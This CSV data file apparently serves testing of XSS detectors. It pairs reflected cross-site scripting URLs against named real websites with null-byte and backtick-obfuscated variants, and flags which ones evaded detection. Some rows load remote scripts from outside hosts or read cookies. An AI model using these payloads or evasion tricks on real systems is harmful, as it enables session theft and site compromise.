Initial Payload,Initial Payload Tokenized,Mutated Payload,Mutated Payload Tokenized,Not Detected
http://www.dm-digifoto.de/cgi-bin/n1/poster.pl?k=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,"[['http://u', '>', '<script>', 'alert(', '""maxwel""', ')', '</script>']]",http://www.dm-digifoto.de/cgi-bin/n1/poster.pl?k=&quot;&lt;%00script&gt;alert`&quot;maxwel&quot;`&lt;/script%00&gt;,"[['http://u', 'None', 'None']]",True
http://www.argus-braeu.at/cms/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;<br>backdoor&lt;/h1&gt;&lt;/marquee&gt;,"[['http://u', '>', '<script>', 'alert(', 'document.cookie', ')', '</script>', '>', '<marquee>', '<h0>', '</h0>', '</marquee>']]",http://www.argus-braeu.at/cms/index.php?page=&quot;&lt;%00script&gt;alert`document.cookie`&lt;%00/script&gt;&lt;marquee&lt;h1%00&gt;<br%00>backdoor&lt;%00/h1&lt;/marquee&gt;,"[['http://u', 'None', 'None', 'None', 'None', 'None']]",True
http://www.pulp.co.nz/content.php?contentid=515&amp;catid=10&amp;sectionid=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;<br>/script&gt;,"[['http://u', 'None', 'None', '>', '<script>', 'alert(', 'document.cookie', ')', '</script>']]",http://www.pulp.co.nz/content.php?contentid=515&amp;catid=10&amp;sectionid=&quot;&lt;%00script%00%00&gt;alert`document.cookie`&lt;<br %00%00/script%00&gt;,"[['http://u', 'None', 'None', 'None', 'None']]",True
http://i-banka.banka-koper.si/info/cgi/infobanka.exe?f=42&amp;site=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;,"[['http://u', 'site=', '>', '<script>', 'alert(', ""'xss'"", ')', '</script>']]",http://i-banka.banka-koper.si/info/cgi/infobanka.exe?f=42&amp;site=&quot;&lt;%00script&gt;alert`xss`&lt;/script%00&gt;,"[['http://u', 'site=', 'None', 'None']]",True
http://appadvice.com/search?searchterm=&lt;iframe src=&quot;http://xssed.com&quot;&gt;,"[['http://u', '<iframe src=""http://xssed.com"">']]",http://appadvice.com/search?searchterm=&lt;%00iframe src=&quot;http://xssed.com&quot;&gt;,"[['http://u', 'None']]",True
http://golf.lagoon.nc/phototheque_golfs/igallery.asp?d=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;<br>by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,"[['http://u', '>', '<script>', 'alert(', ""'xss'"", ')', '</script>', '>', '<marquee>', '<h0>', '</h0>', '</marquee>']]",http://golf.lagoon.nc/phototheque_golfs/igallery.asp?d=&quot;&lt;%00script&gt;top[8680439.toString`30`]`1``xss`&lt;/script%00&gt;&lt;marquee&lt;h1%00&gt;<br%00>by+narcoticxs&lt;%00/h1&lt;/marquee&gt;,"[['http://u', 'None', 'None', 'None', 'None', 'None']]",True
http://halifax.en.craigslist.ca/search/sss?query='&quot;&gt;&lt;script&gt;alert('xss');&lt;/script&gt;,"[['http://u', '>', '<script>', 'alert(', ""'xss'"", ')', '</script>']]",//halifax.en.craigslist.ca/search/sss?query='&quot;&gt;&lt;%00script%00%00%00&gt;&lt;%00script%00%00%00&gt;alert`'xss'`;&lt;/script%00%00%00%00&gt;&lt;%00/script%00%00%00&gt;,"[['http://u', '>', 'None', 'None', ""'xss'"", 'None', 'None']]",False
http://www.ego4u.com/en/community/forum?fid=3%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%<br>3e,"[['http://u', '>', '<script>', 'alert(', 'document.cookie', ')', '</script>']]",http://www.ego4u.com/en/community/forum?fid=3%22%3CSCrIpt%3csCriPT%3csCRIPt%3cscRipt%3ealert%28document.cookie%29%3c/script%<Br><Br><BR><Br>3e,"[['http://u', 'None', 'alert(', 'document.cookie', ')', '</script>']]",False
http://www.lactualite.com/resultat-recherche?cx=012041515408509556353%3axuc9fskx5ca&amp;cof=forid%3a11&amp;i<br>e=utf-8&amp;as_q=/&quot;&gt;&lt;script&gt;alert('xss by<br>atm0n3r')&lt;/script&gt;&amp;op.x=24&amp;op.y=9&amp;form_build_id=form-c07fb0b98a3297ca2b7df5e94c8edb6c&amp;form_id=search<br>_theme_form,"[['http://u', '0:', 'cof=', 'forid:', 'ie=', 'None', '>', '<script>', 'alert(', ')', '</script>', 'x=', 'y=', 'None', 'None']]",http://www.lactualite.com/resultat-recherche?cx=012041515408509556353%3axuc9fskx5ca&amp;cof=forid%3a11&amp;i<br%00%00%00%00%00%00%00%00%00%00%00%00>e=utf-8&amp;as_q=/&quot;&lt;%00%00%00%00%00%00%00%00%00%00%00%00sCRipt&gT;alert`'xss by<BR%00%00%00%00%00%00%00%00%00%00%00%00>atm0n3r'`&LT;/sCRipT&GT;&amp;op.x=24&amp;op.y=9&amp;form_build_id=form-c07fb0b98a3297ca2b7df5e94c8edb6c&amp;form_id=search<br%00%00%00%00%00%00%00%00%00%00%00%00>_theme_form,"[['http://u', '0:', 'cof=', 'forid:', 'None', 'None', 'None', 'None', 'None', '</script>', 'x=', 'y=', 'None', 'None', 'None']]",False
http://travel.mt.gov/categories/listcalendar.asp?title=&lt;script&gt;alert(&quot;ownz+your+system+by+vagrant&quot;)&lt;<br>/script&gt;&lt;meta%20http-equiv=&quot;refresh&quot;content=&quot;0;url=http://www.google.com&quot;&gt;,"[['http://u', '<script>', 'alert(', ')', '</script>', 'None']]",http://travel.mt.gov/categories/listcalendar.asp?title=&lt;script%00&gt;alert`&quot;ownz+your+system+by+vagrant&quot;`&lt;<br%00 /script&gt;&lt;meta%20http-equiv=&quot;refresh&quot;content=&quot;0;url=http://www.google.com&quot;%00&gt;,"[['http://u', 'None', 'None', 'None']]",True
http://blog.epayment.ro/?s=&quot;'/&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,"[['http://u', '>', '<script>', 'alert(', 'document.cookie', ')', '</script>']]",http://blog.epayment.ro/?s=&quot;/&lt;script%00&gt;alert`document.cookie`&lt;/script%00&gt;,"[['http://u', 'None', 'None']]",True
http://images.statelibrary.tas.gov.au/search/titlesearch.asp?title=&lt;script&gt;alert(&quot;cyber_thief(turkey<br>)%20nationteam.com&quot;)&lt;/script&gt;,"[['http://u', '<script>', 'alert(', 'None', ')', ')', '</script>']]",http://images.statelibrary.tas.gov.au/search/titlesearch.asp?title=&lt;script%00&gt;alert`&quot;cyber_thief`turkey<br%00>`%20nationteam.com&quot;`&lt;%00/script&gt;,"[['http://u', 'None', 'None', 'None']]",True
http://www.spchavez.com/spchavez/login.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee<br>&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,"[['http://u', '>', '<script>', 'alert(', 'document.cookie', ')', '</script>', '>', '<marquee>', '<h0>', '</h0>', '</marquee>']]",http://www.spchavez.com/spchavez/login.asp?folder=&quot;&lt;%00script&gt;alert`document.cookie`&lt;/script%00&gt;&lt;marquee<br%00 &lt;h1&gt;by+narcoticxs&lt;/h1&lt;/marquee%00&gt;,"[['http://u', 'None', 'None', 'None', 'None']]",True
http://www.hxhack.com/bbs/thread.php?fid=&quot;&gt;&lt;script&gt;alert(&quot;backdoor&quot;)&lt;/script&gt;,"[['http://u', '>', '<script>', 'alert(', '""backdoor""', ')', '</script>']]",http://www.hxhack.com/bbs/thread.php?fid=&quot;&lt;script%00&gt;alert`&quot;backdoor&quot;`&lt;%00/script&gt;,"[['http://u', 'None', 'None']]",True
http://www.history.com/search.do?searchtext=%22%3e%3cscript%3ealert%281%29%3c%2fscript%3e&amp;targetdb=t<br>hc_books_v2,"[['http://u', '>', '<script>', 'alert(', '0', ')', '</script>', 'None']]",http://www.history.com/search.do?searchtext=%22%3cscript%00%3ealert%281%29%3c%2fscript%00%3e&amp;targetdb=t<br%00>hc_books_v2,"[['http://u', 'None', 'alert(', '0', ')', 'None', 'None', 'None']]",False
http://www.sovadmin.gomel.by/news.php?id=%27%22%3e%3c/title%3e%3cscript%3ealert%281337%29%3c/script%<br>3e,"[['http://u', '>', '</title>', '<script>', 'alert(', '0', ')', '</script>']]",http://www.sovadmin.gomel.by/news.php?id=%27%22%3e%3c/title%3e%3cscript%3ealert%281337%29%3c/script%<br 3e,"[['http://u', '>', '</title>', '<script>', 'alert(', '0', ')', 'None']]",False
https://secure.partyaccount.com/index.htm?target=%22%3e%3cbody%20onload=%22alert('xss')%22%3e%3c/bod<br>y%3e,"[['http://u', '>', 'None', 'None']]",https://secure.partyaccount.com/index.htm?target=%22%3cbody%20onload=%22alert(xss)%22%3c/bod<br>y%3e,"[['http://u', 'None']]",True
http://forums.starwars.com/thread.jspa?threadid=256730&amp;tstart=0%3ciframe%20src=%22http://foro.unders<br>ecurity.net/index.php%22%20onload=alert(/xss/.source)%3e,"[['http://u', 'None', 'None']]",http://forums.starwars.com/thread.jspa?threadid=256730&amp;tstart=0%3ciframe%20src=%22http://foro.unders<br>ecurity.net/index.php%22%20onload=alert(/xss/.source)%3e,"[['http://u', 'None', 'None']]",True
http://www.centrotecniconline.it/galleria/login.asp?folder=videoproiettori&amp;n=&quot;&gt;&lt;script&gt;alert(documen<br>t.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,"[['http://u', 'n=', '>', '<script>', 'alert(', 'document.cookie', ')', '</script>', '>', '<marquee>', '<h0>', '</h0>', '</marquee>']]",http://www.centrotecniconline.it/galleria/login.asp?folder=videoproiettori&amp;n=&quot;&lt;script%00&gt;alert`documen<br%00>t.cookie`&lt;/script%00&gt;&lt;%00marquee&lt;h1&gt;by+narcoticxs&lt;/h1&lt;%00/marquee&gt;,"[['http://u', 'n=', 'None', 'None', 'None', 'None', 'None']]",True
https://ssl.chukei.co.jp/cgi-bin/mlm/mlm_confirm.rb?email=%27%3e%22%3e%3cscript%2fsrc%3dhttp%3a%2f%2<br>fkusomiso%2ecom%2fxss%2ejs%3e%3c%2fscript%3e&amp;mla=1&amp;mlb=1&amp;htmlml=1&amp;submit=%8am%94f&amp;submit2=%83%8a%83z<br>%83b%83g,"[['http://u', '>', '>', '<script/src=http://kusomiso.com/xss.js>', '</script>', 'None', 'None', 'None', 'submit=', 'submit0=']]",https://ssl.chukei.co.jp/cgi-bin/mlm/mlm_confirm.rb?email=%27%3e%22%3cscript%2fsrc%3dhttp%3a%2f%2<br%00 fkusomiso%2ecom%2fxss%2ejs%3c%2fscript%3e&amp;mla=1&amp;mlb=1&amp;htmlml=1&amp;submit=%8am%94f&amp;submit2=%83%8a%83z<br%00 %83b%83g,"[['http://u', '>', 'None', 'None', 'None', 'None', 'submit=', 'submit0=', 'None']]",False
http://www.pompiers.gouv.mc/321/wwwnew.nsf/c3241c4782f528bdc1256d52004f970b/06d8527cdf4849a8c12571bd<br>002db234!opendocument&amp;%22%3e%3cscript%3ealert(123)%3c/script%3e,"[['http://www', '>', '<script>', 'alert(', '0', ')', '</script>']]",http://www.pompiers.gouv.mc/321/wwwnew.nsf/c3241c4782f528bdc1256d52004f970b/06d8527cdf4849a8c12571bd<br%00>002db234!opendocument&amp;%22%3c%00script%3ealert`123`%3c/script%00%3e,"[['http://www', 'None', 'None', 'None']]",True
http://2.tool.ms/login.cgi?id='%3e%22%3e%3cscript/src=http://kusomiso.com/xss.js%3e%3c/script%3e,"[['http://u', '>', '>', '<script/src=http://kusomiso.com/xss.js>', '</script>']]",http://2.tool.ms/login.cgi?id=%3e%22%3cscript/src=http://kusomiso.com/xss.js%3c/script%00%3e,"[['http://u', '>', 'None']]",False
http://www.tr.spy-h.net/deface_mirror/?id=1%22%3e%27%3e%3c%2f%69%66%72%61%6d%65%3e%3c%53%43%52%49%50<br>%54%2f%53%52%43%3d%68%74%74%70%3a%2f%2f%6b%75%73%6f%6d%69%73%6f%2e%63%6f%6d%2f%78%73%73%2e%6a%73%3e%<br>3c%2f%53%43%52%49%50%54%3e,"[['http://u', '>', '>', '</iframe>', 'None', 'None']]",http://www.tr.spy-h.net/deface_mirror/?id=1%22%3e%27%3c%00%00%2f%69%66%72%61%6d%65%00%00%00%3c%00%53%43%52%49%50<br%00%00%00>%54%2f%53%52%43%3d%68%74%74%70%3a%2f%2f%6b%75%73%6f%6d%69%73%6f%2e%63%6f%6d%2f%78%73%73%2e%6a%73%00%00%3e%<br%00%00%00%00%00%00>3c%2f%53%43%52%49%50%54%3e,"[['http://u', '>', 'None', 'None', 'http://kusomiso', '>', 'None', '>']]",False
http://presskey.org/%22%3e%3cscript%20src=http://www.mutantsrus.net/xss.js%3e.cfm?pt=2&amp;sp=2&amp;vid=1197<br>069366_3x03x1386802853&amp;rpt=2&amp;kt=1,"[['http://u', 'http://www', '>', 'None', 'None', 'None', 'None', 'None']]",http://presskey.org/%22%3c%00script%20src=http://www.mutantsrus.net/xss.js%00%00%00%00%3e.cfm?pt=2&amp;sp=2&amp;vid=1197<br 069366_3x03x1386802853&amp;rpt=2&amp;kt=1,"[['http://u', 'http://www', '>', 'None', 'None', 'None', 'None', 'None', 'None']]",False
http://42.911-job.ru/az.php?zc=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,"[['http://u', '>', '<script>', 'alert(', '""maxwel""', ')', '</script>']]",http://42.911-job.ru/az.php?zc=&quot;&lt;%00script&gt;alert`&quot;maxwel&quot;`&lt;%00/script&gt;,"[['http://u', 'None', 'None']]",True
http://muzik.ekolay.net/haber.asp?pid=47&amp;hid=1&amp;haberid=494735&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;,"[['http://u', 'None', 'None', '>', '<script>', 'alert(', '0', ')', '</script>']]",http://muzik.ekolay.net/haber.asp?pid=47&amp;hid=1&amp;haberid=494735&quot;&lt;script%00&gt;alert`1`&lt;/script%00&gt;,"[['http://u', 'None', 'None', 'None', 'None']]",True
http://www.secure-x-001.net/secure-x.asp?direction=emerging.htm&amp;amp;site=109&amp;amp;portal=100&amp;amp;inli<br>ne=true&amp;amp;hidetop=true%27%22%3e%3c/title%3e%3cscript%3ealert%281337%29%3c/script%3e%27%22%3e%3cmar<br>quee%3e%3ch1%3exylitol%3c/h1%3e%3c/marquee%3e,"[['http://u', 'site=', 'None', 'None', 'None', '>', '</title>', '<script>', 'alert(', '0', ')', '</script>', '>', '<marquee>', '<h0>', '</h0>', '</marquee>']]",http://www.secure-x-001.net/secure-x.asp?direction=emerging.htm&amp;amp;site=109&amp;amp;portal=100&amp;amp;inli<br%00 ne=true&amp;amp;hidetop=true%27%22%3c/title%00%3c/title%00%3c%00%00script%3c%00script%3c/title%00%3c/title%00%3c%00script%3c%00script%3c/title%00%3c/title%00%3c%00script%3c%00script%3c/title%00%3c/title%00%3c%00script%3c%00script%00%3ealert%281337%29%3c%00/script%3c%00/script%3c%00/script%3c%00/script%00%3c%00/script%3c%00/script%3c%00/script%3c%00%00/script%3e%27%22%3cmar<br%00 quee%3cmar<br%00 quee%3ch1%00%3ch1%00%3cmar<br%00 quee%3cmar<br%00 quee%3ch1%00%3c%00h1%00%3cmar<br%00 quee%3cmar<br%00 quee%3ch1%00%3c%00h1%00%3cmar<br%00 quee%3cmar<br%00 quee%3ch1%00%3ch1%00%3exylitol%3c%00/h1%3c%00/h1%3c/marquee%00%3c/marquee%00%3c%00%00/h1%3c%00/h1%3c/marquee%00%3c/marquee%00%3c%00/h1%3c%00/h1%3c/marquee%00%3c/marquee%00%3c%00/h1%3c%00%00/h1%3c/marquee%00%3c/marquee%00%3e,"[['http://u', 'site=', 'None', 'None', 'alert(', '0', ')', 'None', 'None', 'None']]",False
http://www.marijkepcoh.nl/album/folderview.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;mar<br>quee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,"[['http://u', '>', '<script>', 'alert(', 'document.cookie', ')', '</script>', '>', '<marquee>', '<h0>', '</h0>', '</marquee>']]",http://www.marijkepcoh.nl/album/folderview.asp?folder=&quot;&lt;%00script&gt;alert`document.cookie`&lt;/script%00&gt;&lt;mar<br%00 quee&lt;h1&gt;by+narcoticxs&lt;%00/h1&lt;/marquee&gt;,"[['http://u', 'None', 'None', 'None', 'None']]",True
http://www.eurosinosourcing.com.cn/spip.php?action=cookie&amp;url=java:%22/%3cscript%3ealert('hello%20th<br>e%20rat')%3c/script%3e,"[['http://u', 'url=', 'java:', '<script>', 'alert(', ')', '</script>']]",http://www.eurosinosourcing.com.cn/spip.php?action=cookie&amp;url=java:%22/%3cscript%00%3ealert`'hello%20th<br%00>e%20rat'`%3c%00/script%3e,"[['http://u', 'url=', 'java:', 'None', 'None', 'None']]",True
http://hukutomo.com/orz/orz.cgi/-/xssed.com/'%3e%22%3e'%3e%3cscript%3ealert(%22xss%22)%3c/script%3e,"[['http://u', '>', '>', '>', '<script>', 'alert(', '""xss""', ')', '</script>']]",http://hukutomo.com/orz/orz.cgi/-/xssed.com/'%3e%22%3e'%3c%00script%3c%00%00%00%00script%00%00%3ealert`%22xss%22`%3c%00%00/script%3c%00%00%00/script%00%00%3e,"[['None', '>', '>', 'None', 'None']]",False
http://www.fifamaster.org/index.php?item=programme&amp;sub=assessment_and_exams}%3c/style%3e%3cscript%3e<br>a=eval;b=alert;a(b(/xss/.source));%3c/script%3e,"[['http://u', 'None', '</style>', '<script>', 'a=', 'b=', 'a(', 'b(', '/xss/.source)', ')', '</script>']]",http://www.fifamaster.org/index.php?item=programme&amp;sub=assessment_and_exams}%3c%00/style%3e%3cscript%00%3e<br a=eval;b=alert;a(b(/xss/.source));%3c%00/script%3e,"[['http://u', 'None', 'None', 'None', 'None']]",True
http://www.xoox.co.il/programs/search.php?q=%3cscript%3ealert(document.cookie)%3c/script%3e,"[['http://u', '<script>', 'alert(', 'document.cookie', ')', '</script>']]",http://www.xoox.co.il/programs/search.php?q=%3cscript%00%3ealert`document.cookie`%3c%00/script%3e,"[['http://u', 'None', 'None']]",True
http://yaggs.de/searchterms/search?searchterm%5bname%5d=%22%3e%3cscript%3ealert%281%29%3c%2fscript%3<br>e&amp;go=suchen,"[['http://u', '>', '<script>', 'alert(', '0', ')', '</script>', 'go=']]",http://yaggs.de/searchterms/search?searchterm%5bname%5d=%22%3e%3cscript%3ealert%281%29%3c%2fscript%3<br>e&amp;go=suchen,"[['http://u', '>', '<script>', 'alert(', '0', ')', '</script>', 'go=']]",False
http://shop.internet.com/index.php?ic_ic=1&amp;ic_query_search=1&amp;ic_querytext=&quot;&gt;&lt;script&gt;alert('trex')&lt;/s<br>cript&gt;,"[['http://u', 'None', 'None', '>', '<script>', 'alert(', ""'trex'"", ')', '</script>']]",http://shop.internet.com/index.php?ic_ic=1&amp;ic_query_search=1&amp;ic_querytext=&quot;&LT;%00%00sCriPT&gt;alert`'trex'`&lt;/s<br%00 CrIPT%00&GT;,"[['http://u', 'None', 'None', 'None', ""'trex'"", 'None']]",False
http://stocks.usatoday.com/custom/usatoday-com/html-quote.asp?symb=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;<br>/script&gt;,"[['http://u', '>', '<script>', 'alert(', 'document.cookie', ')', '</script>']]",http://stocks.usatoday.com/custom/usatoday-com/html-quote.asp?symb=&quot;&lt;script%00&gt;alert`document.cookie`&lt;%00<br>/script&gt;,"[['http://u', 'None', 'None']]",True
http://www.pittsburghlive.com/x/search/?searchwords=&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;&amp;fields=full&amp;paper=a<br>ll&amp;search_range=quick&amp;quick=7&amp;amonth=01&amp;aday=01&amp;ayear=2009&amp;bmonth=01&amp;bday=01&amp;byear=2009&amp;pg_len=25&amp;so<br>rt_by=story_date&amp;result_type=with,"[['http://u', '>', '<script>', 'alert(', '0', ')', '</script>', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None']]",http://www.pittsburghlive.com/x/search/?searchwords=&quot;&lt;script%00&gt;alert`1`;&lt;%00/script&gt;&amp;fields=full&amp;paper=a<br%00>ll&amp;search_range=quick&amp;quick=7&amp;amonth=01&amp;aday=01&amp;ayear=2009&amp;bmonth=01&amp;bday=01&amp;byear=2009&amp;pg_len=25&amp;so<br%00>rt_by=story_date&amp;result_type=with,"[['http://u', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None']]",True
http://www.jobs.ac.uk/cgi-bin/search.cgi?keywords=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,"[['http://u', '>', '<script>', 'alert(', '""maxwel""', ')', '</script>']]",http://www.jobs.ac.uk/cgi-bin/search.cgi?keywords=&quot;&lt;script%00&gt;alert`&quot;maxwel&quot;`&lt;%00/script&gt;,"[['http://u', 'None', 'None']]",True
http://3.tool.ms/snchange.cgi?id='%3e%22%3e%3cscript/src=http://kusomiso.com/xss.js%3e%3c/script%3e,"[['http://u', '>', '>', '<script/src=http://kusomiso.com/xss.js>', '</script>']]",http://3.tool.ms/snchange.cgi?id='%3e%22%3c%00script/src=http://kusomiso.com/xss.js%3c%00/script%3e,"[['http://u', '>', 'None']]",False
http://www.tuba.gov.tr/yayingoster.php?yayin=gunce?ref=''&gt;&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;/s<br>cript&gt;,"[['http://u', 'ref=', '>', '</script>', '<script>', 'alert(', 'document.cookie', ')', '</script>']]",http://www.tuba.gov.tr/yayingoster.php?yayin=gunce?ref=&lt;/script%00&lt;%00script&gt;alert`document.cookie`&lt;/s<br%00 cript&gt;,"[['http://u', 'ref=', 'None', 'None']]",True
http://www.webscriptsdirectory.com/cgi-bin/page.cgi?g=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,"[['http://u', '>', '<script>', 'alert(', '""maxwel""', ')', '</script>']]",http://www.webscriptsdirectory.com/cgi-bin/page.cgi?g=&quot;&lt;script%00&gt;alert`&quot;maxwel&quot;`&lt;%00/script&gt;,"[['http://u', 'None', 'None']]",True
http://www.arabamburada.com/arama.asp?sehir=&quot;&gt;&lt;script&gt;alert(&quot;bluemax&quot;)&lt;/script&gt;,"[['http://u', '>', '<script>', 'alert(', '""bluemax""', ')', '</script>']]",http://www.arabamburada.com/arama.asp?sehir=&quot;&lt;script%00&gt;alert`&quot;bluemax&quot;`&lt;/script%00&gt;,"[['http://u', 'None', 'None']]",True
http://www.ogi.yildiz.edu.tr/index1.php?k=21&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,"[['http://u', '>', '<script>', 'alert(', 'document.cookie', ')', '</script>']]",http://www.ogi.yildiz.edu.tr/index1.php?k=21&quot;&lt;script&lt;script&lt;script&lt;script&gt;alert`document.cookie`&lt;/script&lt;/script&lt;/script&lt;/script&gt;,"[['http://u', 'None', 'None']]",True
http://one.msn.co.il/pictures/search.asp?submit.x=31&amp;submit.y=12&amp;data=%22%3e%3cscript%3ealert%281%29<br>%3c%2fscript%3e&amp;worldx=1,"[['http://u', 'y=', 'None', '>', '<script>', 'alert(', '0', ')', '</script>', 'None']]",http://one.msn.co.il/pictures/search.asp?submit.x=31&amp;submit.y=12&amp;data=%22%3cscript%00%3cscript%00%3etop[8680439.toString`30`]`1`%281%29<br%00/ %3c%00%2fscript%3c%00%2fscript%3e&amp;worldx=1,"[['http://u', 'y=', 'None', 'None', '0', ')', 'None', 'None']]",False
http://www.bartinmesem.k12.tr/index2.php?option=com_content&amp;user_rating=1&amp;submit_vote=index2.php?opt<br>ion=com_content&amp;user_rating=1&amp;submit_vote=%e8%a9%95%e4%be%a1&amp;task=vote&amp;pop=0&amp;itemid=10&amp;cid=1&amp;url=htt<br>p://www.xssed.com,"[['http://u', 'user_rating=', 'submit_vote=', 'option=', 'user_rating=', 'submit_vote=', 'task=', 'pop=', 'itemid=', 'cid=', 'url=', 'http://www']]",http://www.bartinmesem.k12.tr/index2.php?option=com_content&amp;user_rating=1&amp;submit_vote=index2.php?opt<br>ion=com_content&amp;user_rating=1&amp;submit_vote=%e8%a9%95%e4%be%a1&amp;task=vote&amp;pop=0&amp;itemid=10&amp;cid=1&amp;url=htt<br>p://www.xssed.com,"[['http://u', 'user_rating=', 'submit_vote=', 'option=', 'user_rating=', 'submit_vote=', 'task=', 'pop=', 'itemid=', 'cid=', 'url=', 'http://www']]",True
